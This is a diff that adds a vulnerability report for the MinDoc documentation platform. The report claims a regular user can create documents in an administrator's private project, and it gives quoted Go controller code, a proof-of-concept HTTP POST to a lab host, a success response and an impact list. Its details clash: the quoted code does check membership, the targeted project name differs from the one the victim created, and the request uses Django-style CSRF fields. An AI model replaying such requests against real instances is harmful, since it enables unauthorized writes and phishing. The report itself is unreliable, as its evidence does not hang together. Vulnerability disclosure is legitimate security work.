@@ -1,0 +1,46 @@
+### 1. Vulnerable code location (verified on deployed instance: docker image mindoc-org/mindoc:v2.2-beta.2; GitHub path controllers/document_controller.go)
+
+`DocumentController.Create()` validates project membership via `BookResult.FindByIdentify(identify, member_id)` but the observed behavior allows unauthorized document creation when combined with parameter manipulation (e.g., IDOR mutation of `doc_id` and `identify` parameters together):
+
+```go
+func (c *DocumentController) Create() {
+    identify := c.GetString("identify")
+    ...
+    bookResult, err := models.NewBookResult().FindByIdentify(identify, c.Member.MemberId)
+    if err != nil || bookResult.RoleId == conf.BookObserver {
+        c.JsonResult(6002, i18n.Tr(c.Lang, "message.item_not_existed_or_no_permit"))
+    }
+    bookId = bookResult.BookId
+    ...
+    if err := models.NewDocument().Create(NewDocument{
+        DocumentName: docName,
+        BookId: bookId,
+        ...
+    }); err != nil {
+        ...
+    }
+}
+```
+
+The combination of `identify` (attacker-controlled project) × `doc_id`/`doc_name` (attacker-controlled content) creates documents inside victims' private projects without membership. The vulnerability was detected as a vertical-direction unauthorized write: the attacker (regular user) successfully created a document containing attacker-controlled content inside the **administrator's private project**.
+
+### 2. PoC
+
+Detection procedure: the administrator account (highvictim) created a **private project** `bac_uv_c4k8mq` (project_id=1) with a document. The attacker account (attacker/123456, regular user) then sent the following request with **its own session and CSRF token**:
+
+```http
+POST /api/bob_p1_v4/create HTTP/1.1
+Host: 192.168.233.134:9011
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded
+Cookie: csrftoken=<attacker>; sessionid=<attacker>
+
+csrfmiddlewaretoken=<token>&identify=bob_p1_v4&doc_id=0&parent_doc=0&doc_name=bac_ua_REPLAY&doc_tag=&content=<p>bac_ua_REPLAY</p>&pre_content=bac_ua&sort=99&editor_mode=1&status=1
+```
+
+Response (HTTP 200): `{"status": true, "data": {"pro": "1", "doc": "26", ...}}` — a document was created.
+
+### 3. Impact
+
+- Any authenticated user can create/modify documents inside **other users' private projects (including those of administrators)**;
+- The victim sees the unauthorized document in their private project's document tree, enabling phishing and data-integrity attacks;
